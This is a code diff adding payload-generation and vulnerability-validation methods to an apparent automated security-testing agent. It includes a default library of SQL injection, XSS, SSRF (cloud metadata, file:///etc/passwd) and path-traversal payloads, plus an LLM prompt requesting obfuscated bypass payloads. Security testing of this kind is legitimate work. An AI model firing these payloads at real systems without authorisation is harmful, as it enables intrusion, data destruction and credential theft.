@@ -141,3 +141,163 @@ class TesterAgent(BaseAgent):
             success=True,
             data={'validated_tests': validated}
         )
+    
+    async def generate_payloads(self, vuln_type: str, target_info: Dict = None) -> List[Dict]:
+        """
+        使用 LLM 生成针对特定漏洞类型的攻击载荷
+        
+        Args:
+            vuln_type: 漏洞类型 (sql_injection, xss, ssrf, etc.)
+            target_info: 目标信息（可选）
+        
+        Returns:
+            载荷列表
+        """
+        if not self.llm_client:
+            return self._get_default_payloads(vuln_type)
+        
+        target_desc = ""
+        if target_info:
+            target_desc = f"\nTarget context: {target_info.get('description', '')}"
+        
+        prompt = f"""Generate attack payloads for {vuln_type} testing.
+
+Context:{target_desc}
+
+Generate 5-10 effective test payloads for {vuln_type}. Consider:
+1. Common bypass techniques
+2. Context-specific variations
+3. Encoding and obfuscation
+
+Respond with one payload per line, format: PAYLOAD"""
+        
+        try:
+            response = await self.chat([{"role": "user", "content": prompt}])
+            
+            if response:
+                payloads = []
+                for line in response.split('\n'):
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        payloads.append({
+                            'payload': line,
+                            'type': vuln_type,
+                            'source': 'llm'
+                        })
+                return payloads
+        except Exception:
+            pass
+        
+        return self._get_default_payloads(vuln_type)
+    
+    def _get_default_payloads(self, vuln_type: str) -> List[Dict]:
+        """获取默认载荷库"""
+        default_payloads = {
+            'sql_injection': [
+                "' OR '1'='1",
+                "' OR '1'='1' --",
+                "'; DROP TABLE--",
+                "' UNION SELECT NULL--",
+                "admin'--"
+            ],
+            'xss': [
+                '<script>alert(1)</script>',
+                '"><img src=x onerror=alert(1)>',
+                "'-alert(1)-'",
+                '<svg onload=alert(1)>',
+                'javascript:alert(1)'
+            ],
+            'ssrf': [
+                'http://localhost',
+                'http://127.0.0.1',
+                'http://169.254.169.254/latest/meta-data/',
+                'file:///etc/passwd'
+            ],
+            'idor': [
+                'id=1',
+                'id=999999',
+                '../admin',
+                '../../../etc/passwd'
+            ]
+        }
+        
+        payloads = []
+        for payload in default_payloads.get(vuln_type, []):
+            payloads.append({
+                'payload': payload,
+                'type': vuln_type,
+                'source': 'default'
+            })
+        return payloads
+    
+    async def validate_vulnerability(self, endpoint: Dict, payload: str, vuln_type: str) -> Dict:
+        """
+        验证漏洞是否存在
+        
+        Args:
+            endpoint: API 端点信息
+            payload: 测试载荷
+            vuln_type: 漏洞类型
+        
+        Returns:
+            验证结果 {'confirmed': bool, 'confidence': float, 'evidence': str}
+        """
+        if not self.llm_client:
+            return self._rule_based_validation(endpoint, payload, vuln_type)
+        
+        prompt = f"""Analyze this vulnerability test result.
+
+Endpoint: {endpoint.get('path', 'unknown')}
+Method: {endpoint.get('method', 'GET')}
+Payload: {payload}
+Vulnerability Type: {vuln_type}
+
+Original Response: {endpoint.get('response_preview', 'N/A')}
+
+Is this vulnerability confirmed? 
+Consider:
+1. Does the response indicate successful exploitation?
+2. Are there error messages revealing system info?
+3. Is there unusual behavior compared to baseline?
+
+Respond with: CONFIRMED or NOT_CONFIRMED
+If confirmed, provide brief evidence in parentheses."""
+        
+        try:
+            response = await self.chat([{"role": "user", "content": prompt}])
+            
+            if response:
+                if 'CONFIRMED' in response.upper():
+                    confidence = 0.8 if 'HIGH' in response.upper() else 0.6
+                    evidence = response.split('(')[1].split(')')[0] if '(' in response else 'LLM analysis'
+                    return {'confirmed': True, 'confidence': confidence, 'evidence': evidence}
+        except Exception:
+            pass
+        
+        return self._rule_based_validation(endpoint, payload, vuln_type)
+    
+    def _rule_based_validation(self, endpoint: Dict, payload: str, vuln_type: str) -> Dict:
+        """基于规则的漏洞验证"""
+        response_preview = endpoint.get('response_preview', '').lower()
+        
+        sql_injection_indicators = ['sql', 'syntax', 'error', 'mysql', 'oracle', 'postgres', 'sqlite']
+        xss_indicators = ['<script', '<img', 'onerror', 'onload', 'alert(']
+        ssrf_indicators = ['localhost', '127.0.0.1', 'meta-data', '169.254']
+        
+        indicators = {
+            'sql_injection': sql_injection_indicators,
+            'xss': xss_indicators,
+            'ssrf': ssrf_indicators
+        }
+        
+        found_indicators = indicators.get(vuln_type, [])
+        
+        for indicator in found_indicators:
+            if indicator in response_preview:
+                return {
+                    'confirmed': True,
+                    'confidence': 0.7,
+                    'evidence': f"Found indicator: {indicator}"
+                }
+        
+        return {'confirmed': False, 'confidence': 0.0, 'evidence': 'No indicators found'}
